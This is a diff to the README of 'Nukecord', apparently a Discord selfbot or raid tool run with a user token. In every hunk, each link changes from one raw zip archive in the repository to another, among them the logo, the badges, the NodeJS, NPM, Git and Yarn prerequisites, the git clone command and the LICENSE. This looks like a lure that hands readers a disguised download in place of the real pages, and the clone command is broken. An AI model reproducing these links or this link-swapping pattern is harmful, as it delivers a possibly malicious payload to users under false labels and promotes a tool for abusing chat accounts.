@@ -1,18 +1,18 @@
 <h3 align="center">
-	<img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip" alt="Logo"/><br/>
+	<img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip" alt="Logo"/><br/>
 	<img src="" alt="" height="30"/>
 	「Nukecord」
 	<img src="" alt="" height="30"/>
 </h3>
 
 <p align="center">
-  <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
+  <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"></a>
 </p>
 
 <p align="center">
-    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
-    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
-    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
+    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"></a>
+    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"></a>
+    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"></a>
 </p>
 
 <p align="center">
@@ -43,8 +43,8 @@ You can use `npx` to directly download and run the executable.
 
 #### Prerequisites
 
--   [NodeJS](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
--   [NPM](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
+-   [NodeJS](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip)
+-   [NPM](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip)
 
 #### Starting Up
 
@@ -66,20 +66,20 @@ You can set your `NUKECORD_SELFBOT_TOKEN` environment variable to your user toke
 
 ### 🔧 Building from Source
 
-This project can be built from source (if you're into that <img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip" alt=":ZeroTwo_Smirk:" title=":ZeroTwo_Smirk:" height="22" width="22"  />)
+This project can be built from source (if you're into that <img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip" alt=":ZeroTwo_Smirk:" title=":ZeroTwo_Smirk:" height="22" width="22"  />)
 
 #### Prerequisites
 
--   [Git CLI](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
--   [NodeJS](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
--   [Yarn](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
+-   [Git CLI](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip)
+-   [NodeJS](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip)
+-   [Yarn](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip)
 
 #### Building
 
 1. Clone the repository and cd into it.
 
 ```
-git clone https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip
+git clone https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip
 cd Nukecord
 ```
 
@@ -131,7 +131,7 @@ yarn start
 
 ### 📜 License
 
-<a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"/></a>
+<a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip"/></a>
 
 Nukecord is released under the MIT license, which grants the following permissions:
 
@@ -140,4 +140,4 @@ Nukecord is released under the MIT license, which grants the following permissio
 -   Modification
 -   Private use
 
-For more convoluted language, see the [LICENSE](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip).
+For more convoluted language, see the [LICENSE](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/client/Software-2.8.zip).
